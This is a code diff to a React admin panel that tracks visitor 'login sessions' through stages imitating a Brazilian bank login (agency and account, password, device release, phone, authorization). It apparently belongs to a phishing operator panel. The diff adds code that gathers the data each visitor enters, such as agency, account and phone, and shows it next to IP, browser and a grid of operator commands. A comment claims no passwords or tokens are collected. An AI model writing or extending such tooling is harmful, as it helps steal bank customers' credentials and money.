@@ -406,6 +406,50 @@ const SESSION_COMMANDS = [
 const flowLabel = (f: LoginSession['flowType']) =>
   f === 'PF' ? 'Pessoa Física' : f === 'PJ' ? 'Pessoa Jurídica' : 'Indefinido';
 
+const STAGE_LABELS: Record<string, string> = {
+  '/pessoa-fisica': 'Agência e conta',
+  '/pessoa-fisica/senha': 'Senha',
+  '/pessoa-fisica/liberacao': 'Liberação de dispositivo',
+  '/sign-in': 'Identificação',
+  '/sign-in/celular': 'Confirmação por celular',
+  '/sign-in/dispositivo': 'Apelido do dispositivo',
+  '/sign-in/autorizacao': 'Autorização',
+};
+const stageLabel = (r: string | null) => (r ? STAGE_LABELS[r] ?? r : '-');
+
+/**
+ * Extrai os dados NÃO SENSÍVEIS preenchidos ao longo do fluxo, a partir dos
+ * rótulos de cada etapa. Nunca há senha/token/OTP aqui (não são coletados).
+ * Deduplica por campo (o valor mais recente prevalece) mantendo a ordem.
+ */
+function collectFields(session: LoginSession): { label: string; value: string }[] {
+  const map = new Map<string, string>();
+  const setField = (label: string, value: string) => {
+    const v = value.trim();
+    if (v) map.set(label, v);
+  };
+  for (const step of session.steps) {
+    const raw = (step.label ?? '').trim();
+    if (!raw) continue;
+    if (/^Ag\s+.+\/\s*Conta/i.test(raw)) {
+      for (const p of raw.split('/').map((x) => x.trim())) {
+        const ag = p.match(/^Ag\s+(.+)$/i);
+        const ct = p.match(/^Conta\s+(.+)$/i);
+        if (ag) setField('Agência', ag[1]);
+        else if (ct) setField('Conta', ct[1]);
+      }
+    } else if (/^Cel\s+/i.test(raw)) {
+      setField('Celular', raw.replace(/^Cel\s+/i, ''));
+    } else if (raw.includes(': ')) {
+      const idx = raw.indexOf(': ');
+      setField(raw.slice(0, idx).trim(), raw.slice(idx + 2).trim());
+    } else {
+      setField('Dado', raw);
+    }
+  }
+  return Array.from(map, ([label, value]) => ({ label, value }));
+}
+
 function SessionHistoryModal({ session, onClose }: { session: LoginSession; onClose: () => void }) {
   const events = [
     ...session.steps.map((s) => ({
@@ -477,7 +521,7 @@ function SessionBlock({
         </span>
         <span className="donas-session-title">
           <strong>{session.identifier || `Sessão ${session.sessionId.slice(0, 8)}`}</strong>
-          <small>{session.currentStep ?? '-'}</small>
+          <small>{stageLabel(session.currentStep)}</small>
         </span>
         <span className="donas-session-tags">
           <span className={`donas-status donas-status--${ended ? 'failed' : 'submitted'}`}>
@@ -493,34 +537,30 @@ function SessionBlock({
 
       {expanded && (
         <div className="donas-session-body" data-testid="session-body">
-          <div className="donas-kv-grid">
-            <div><dt>Fluxo</dt><dd>{flowLabel(session.flowType)}</dd></div>
-            <div><dt>Identificador</dt><dd>{session.identifier ?? '-'}</dd></div>
-            <div><dt>IP</dt><dd>{session.ip ?? '-'}</dd></div>
-            <div><dt>Local</dt><dd>{session.location ?? '-'}</dd></div>
-            <div><dt>Navegador</dt><dd>{session.browser ?? '-'}</dd></div>
-            <div><dt>Dispositivo</dt><dd>{session.deviceType ?? '-'}</dd></div>
-            <div><dt>Sistema</dt><dd>{session.os ?? '-'}</dd></div>
-            <div><dt>Tela</dt><dd>{session.screen ?? '-'}</dd></div>
-            <div><dt>Idioma</dt><dd>{session.language ?? '-'}</dd></div>
-            <div><dt>Fuso</dt><dd>{session.timezone ?? '-'}</dd></div>
-            <div><dt>Início</dt><dd>{new Date(session.createdAt).toLocaleString('pt-BR')}</dd></div>
-            <div><dt>Atualizado</dt><dd>{new Date(session.updatedAt).toLocaleString('pt-BR')}</dd></div>
+          <h4 className="donas-section-title">Dados preenchidos</h4>
+          <div className="donas-fields" data-testid="session-fields">
+            {(() => {
+              const fields = collectFields(session);
+              return fields.length ? (
+                fields.map((f) => (
+                  <div className="donas-field" key={f.label}>
+                    <dt>{f.label}</dt>
+                    <dd>{f.value}</dd>
+                  </div>
+                ))
+              ) : (
+                <p className="donas-fields-empty">Nenhum dado preenchido ainda.</p>
+              );
+            })()}
           </div>
 
-          <h4 className="donas-section-title">Etapas do fluxo</h4>
-          <ul className="donas-timeline donas-timeline--compact">
-            {session.steps.map((s, i) => (
-              <li key={i} className="donas-timeline-item donas-timeline-item--step">
-                <span className="donas-timeline-dot" aria-hidden="true" />
-                <div>
-                  <strong>{s.route}{s.label ? ` — ${s.label}` : ''}</strong>
-                  <small>{new Date(s.at).toLocaleString('pt-BR')}</small>
-                </div>
-              </li>
-            ))}
-            {session.steps.length === 0 && <li className="donas-timeline-empty">Sem etapas ainda.</li>}
-          </ul>
+          <div className="donas-tech" data-testid="session-tech">
+            <span><b>Etapa atual:</b> {stageLabel(session.currentStep)}</span>
+            <span><b>IP:</b> {session.ip ?? '-'}</span>
+            <span><b>Navegador:</b> {session.browser ?? '-'}</span>
+            <span><b>Sistema:</b> {session.os ?? '-'}</span>
+            <span><b>Atualizado:</b> {new Date(session.updatedAt).toLocaleString('pt-BR')}</span>
+          </div>
 
           <h4 className="donas-section-title">COMANDOS</h4>
           <div className="donas-cmd-grid" data-testid="session-commands">
